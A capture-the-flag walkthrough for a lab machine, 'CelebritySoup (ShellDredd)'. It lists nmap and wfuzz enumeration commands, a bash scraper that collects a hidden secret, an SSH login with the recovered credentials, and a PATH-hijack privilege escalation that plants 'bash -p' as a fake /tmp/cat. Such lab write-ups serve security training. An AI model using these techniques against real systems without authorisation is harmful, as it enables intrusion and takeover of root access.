@@ -1,0 +1,46 @@
+CelebritySoup (ShellDredd) Walk-Through
+By Migue27au
+
+1. Enumeration
+  1.1 Find the target machine --> nmap -sn <networkAddress>/<maskAddress>
+  1.2 Scan all ports of target --> nmap -p- <targetIP> -n -T5 -oN allPorts.txt --open
+    ports 21,22 and 80 open
+  1.3 Enumeration target ports --> nmap -p21,22,80 <targetIP> -sC -sV -T5 -oN targetPorts.txt
+  1.4 Check webpage to find something iteresting
+    1.4.1 Find robots.txt with a list of url.
+    1.4.2 Find that only one url has text --> /sector9.html
+      · Create a dictionary of the url in order to find others urls --> cewl "http://<targetIP>/sector9.html" --with-numbers -w dic.text
+      · Launch wfuzz to find new urls --> wfuzz -w dic.txt -w /usr/share/wfuzz/wordlist/general/extensions_common.txt -c --hc 404 http://<targetIP>/FUZZFUZ2Z | tee urls.txt
+      · New URL found (/project2501.html) with a image.
+      · Stego decode of the image and getting --> digital-brain-is-transcending
+    1.4.3. Looking the page find some secrets in /sector1,2,3...
+      Creating a script in order to get the secret fastly:
+      __________________________________________________________________________
+      
+        #!/bin/bash
+        secret=""
+        VAR1=http://<targetIP>/sector;
+        VAR2=".html"
+        for i in {1..10..1}; do
+          VAR3=$VAR1$i$VAR2
+          response=$( curl $VAR3 -s | tail -n 4 | head -n 1 | cut -d '"' -f 2)
+          if [[ $response != "" ]] && [[ $response != "</main>" ]]; then
+           secret=$secret$response
+          fi;
+          echo "URL: $VAR3 --> $secret";
+        done;
+        echo "secret --> $secret";
+    1.4.4 Script return the secret --> puppetmaster
+      __________________________________________________________________________
+  1.5 Candidate to credentials puppetmaster:digital-brain-is-transcending
+2. Access
+  2.1 Connect through SSH with the credentials.
+  2.2 Get the user flag --> cat ~/user.txt
+3. Privilege Escalation
+  3.1 There's a interesting file in home folder: systeminfo
+    · The file is executed by Root.
+    · Getting the Strings of the file it is discovered that the file has a potencial PATH HIJACKING in cat
+    · Creating a malicious cat in tmp. --> echo "bash -p" > /tmp/cat
+    · Modifing the PATH in order to execute first the malicious file /tmp --> export PATH=/tmp:$
+  3.2 Execute systeminfo again and gain root access
+  3.3 Get the root flag --> cat ~/root.txt
